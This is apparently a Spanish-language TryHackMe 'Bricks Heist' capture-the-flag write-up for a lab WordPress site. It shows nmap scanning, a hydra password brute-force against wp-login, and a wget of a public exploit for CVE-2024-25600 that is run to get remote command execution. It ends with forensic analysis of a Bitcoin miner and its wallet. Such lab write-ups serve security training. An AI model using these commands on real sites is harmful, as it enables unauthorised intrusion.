---
title: "trikc"
platform: "THM"
publishedAt: 2025-05-09
cover: "/images/ctf/nota2-cover.webp"
preview: "vbrgbrgbhhrtbr"
tags: [rockyou, Hydra]
link: "pruweba.link"
toc:
  - text: "🔍 Reconocimiento inicial"
    id: "reconocimiento-inicial"
  - text: "🎯 Enumeración de WordPress"
    id: "enumeracion-de-wordpress"
  - text: "🔓 Acceso inicial"
    id: "acceso-inicial"
  - text: "💥 Explotación del CVE"
    id: "explotacion-del-cve"
  - text: "🐚 Post-explotación"
    id: "post-explotacion"
  - text: "📁 Análisis del miner"
    id: "analisis-del-miner"
  - text: "🔓 Decodificación de wallet"
    id: "decodificacion-de-wallet"
  - text: "🕵️ Asociación con grupo de amenazas"
    id: "asociacion-con-grupo-de-amenazas"
  - text: "✅ Conclusión"
    id: "conclusion"
---

---


# 🧱 TryHackMe – Bricks Heist | Write-up técnico


![image.png](/images/ctf/nota2-0.webp)


En este reto de TryHackMe nos enfrentamos a un escenario en el que un sitio WordPress ha sido comprometido por un actor malicioso. Nuestra misión es investigar, identificar cómo se produjo el ataque, qué malware fue desplegado, y qué grupo está detrás.


---


## 🔍 Reconocimiento inicial


Comenzamos con un escaneo completo:


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Se detectan los siguientes servicios:

- **22/tcp** – OpenSSH
- **80/tcp** – WebSockify (retorna error 405)
- **443/tcp** – Apache + WordPress 6.5
- **3306/tcp** – MySQL (sin autenticación)

---


## 🎯 Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

---


## 🔓 Acceso inicial


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💥 Explotación del CVE


Usamos el exploit público para el CVE-2024-25600:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


Al ejecutarlo con credenciales válidas, logramos ejecutar comandos remotos y abrir una **shell interactiva**:


```shell
bash
CopyEdit
python3 CVE-2024-25600.py --url https://bricks.thm --username administrator --password ***** --cmd id
```


---


## 🐚 Post-explotación


Accedemos a `/var/www/html/` y encontramos la flag inicial:


```plain text
CopyEdit
THM{fl46_650c844110baced87e1606453b93f22a}
```


Revisamos los procesos activos y servicios del sistema, encontrando uno sospechoso:


```shell
bash
CopyEdit
ubuntu.service - TRYHACK3M
ExecStart=/lib/NetworkManager/nm-inet-dialog
```


El proceso asociado es: `nm-inet-dialog`.


---


## 📁 Análisis del miner


Identificamos el archivo de log del minero en:


```shell
bash
CopyEdit
/lib/NetworkManager/inet.conf
```


Este archivo contiene líneas como:


```plain text
css
CopyEdit
[*] Bitcoin Miner Thread Started
```


Y una clave codificada como:


```plain text
makefile
CopyEdit
ID: WW1NeGNY...
```


---


## 🔓 Decodificación de wallet


Decodificando el valor de `ID` en base64 (dos veces), obtenemos:


```plain text
nginx
CopyEdit
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


Una dirección de Bitcoin válida (Bech32) usada para recibir ganancias del minero.


---


## 🕵️ Asociación con grupo de amenazas


Rastreando la dirección en fuentes OSINT, encontramos que ha sido usada en transacciones ligadas al grupo de ransomware **LockBit**.


---


## ✅ Conclusión


Este reto combina:

- Enumeración de WordPress
- Explotación real de CVE
- Escalada post-explotación
- Análisis forense y OSINT

**Una práctica redonda** para cualquier profesional de ciberseguridad ofensiva o defensiva.

